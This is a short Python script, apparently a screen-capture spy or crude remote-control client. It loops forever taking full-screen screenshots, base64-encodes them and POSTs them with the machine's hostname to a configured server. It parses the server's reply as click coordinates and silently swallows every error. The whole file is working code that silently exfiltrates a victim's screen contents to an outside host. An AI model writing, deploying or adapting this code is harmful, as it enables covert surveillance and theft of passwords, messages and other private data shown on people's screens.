import json
import base64
import config
import socket
import requests
import pyautogui
from io import BytesIO

while True:
    try:
        SCREEN_SIZE = pyautogui.size()
        img = pyautogui.screenshot(region=(0,0,SCREEN_SIZE[0],SCREEN_SIZE[1]))
        output = BytesIO()
        img.save(output, format="JPEG")
        imdata = output.getvalue()
        b64dat = base64.b64encode(imdata).decode()

        url = f"http://{config.SERVER_IP}:{config.SERVER_PORT}/upload/{socket.gethostname()}"
        headers = {
            "Content-Type": "application/json"
        }
        data = {
            "screen": b64dat
        }
        response = requests.post(url, headers=headers, data=json.dumps(data))
        click = map(int, response.content.decode().split(','));
    except Exception as e:
        pass